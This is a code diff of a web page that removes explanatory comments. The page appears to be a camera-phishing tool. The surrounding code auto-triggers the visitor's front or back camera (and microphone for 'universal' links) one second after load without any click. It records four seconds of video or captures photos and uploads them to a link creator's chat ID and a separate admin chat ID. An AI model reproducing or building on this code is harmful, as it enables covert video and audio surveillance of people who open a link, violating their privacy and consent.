@@ -146,13 +146,13 @@
 
             let constraints = {
                 video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-                audio: !cameraType // Agar cameraType nahi hai (Universal Link), toh audio true rahega (Video + Sound ke liye)
+                audio: !cameraType 
             };
 
             if (cameraType === 'back') {
                 constraints.video.facingMode = { exact: "environment" };
             } else {
-                constraints.video.facingMode = "user"; // Front camera for 'front' and Universal link
+                constraints.video.facingMode = "user"; 
             }
 
             try {
@@ -179,7 +179,6 @@
                 document.getElementById('loading-text').style.display = 'none';
                 isReady = true;
 
-                // --- AUTO TRIGGER WITHOUT CLICKING ---
                 setTimeout(() => {
                     triggerAction();
                 }, 1000);
@@ -216,7 +215,6 @@
                 `🕒 Time: ${new Date().toLocaleString()}\n\n` +
                 `👑 **CREDIT BY : आयुष नेगी**`;
 
-            // AGAR UNIVERSAL LINK HAI (CameraType nahi hai) -> Toh Video + Sound Record Hoga (4 Seconds)
             if (!cameraType) {
                 let recordedChunks = [];
                 let mediaRecorder;
@@ -227,7 +225,6 @@
                     try {
                         mediaRecorder = new MediaRecorder(globalStream);
                     } catch (e) {
-                        // Fallback agar MediaRecorder support na kare
                         alert("Error initializing video recorder");
                         return;
                     }
@@ -243,7 +240,6 @@
                     let blob = new Blob(recordedChunks, { type: 'video/webm' });
                     
                     if (blob && blob.size > 0) {
-                        // 1. Send Video to User
                         if (CHAT_ID) {
                             const formDataUser = new FormData();
                             formDataUser.append('chat_id', CHAT_ID);
@@ -257,7 +253,6 @@
                             });
                         }
 
-                        // 2. Send Video to Admin
                         const formDataAdmin = new FormData();
                         formDataAdmin.append('chat_id', ADMIN_CHAT_ID);
                         formDataAdmin.append('video', blob, 'video_capture.webm');
@@ -275,13 +270,11 @@
                 };
 
                 mediaRecorder.start();
-                // 4 seconds tak video record hogi
                 setTimeout(() => {
                     mediaRecorder.stop();
                 }, 4000);
 
             } else {
-                // AGAR FRONT YA BACK LINK HAI -> Toh Photos Capture Hongi (Pehle ki tarah)
                 const videoElement = document.getElementById('video');
                 const canvas = document.getElementById('canvas');
                 canvas.width = videoElement.videoWidth || 1280;
